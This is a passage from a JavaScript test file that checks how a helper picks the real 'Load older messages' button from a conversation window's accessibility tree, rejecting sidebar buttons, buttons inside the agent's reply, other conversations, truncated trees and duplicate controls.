  assert.equal(olderButton(nodes.filter((_, index) => index !== 4), TITLE), -1, 'the sidebar one is not the conversation\'s');
  assert.throws(() => olderButton(nodes, 'Other - ws - Antigravity'), /other_conversation/);
  // A button the agent's reply renders is not the conversation's.
  const replied = [...nodes.filter((_, index) => index !== 4), { depth: 2, role: 'AXHeading', label: 'Agent said' }, { depth: 3, role: 'AXButton', label: 'Load older messages, showing 1 of 9' }];
  assert.equal(olderButton(replied, TITLE), -1);
  assert.throws(() => olderButton(Object.assign([...nodes], { truncated: true }), TITLE), /truncated/);
  assert.throws(() => olderButton([...nodes, { depth: 2, role: 'AXButton', label: 'Load older messages, showing 2 of 3' }], TITLE), /several_controls/);
});

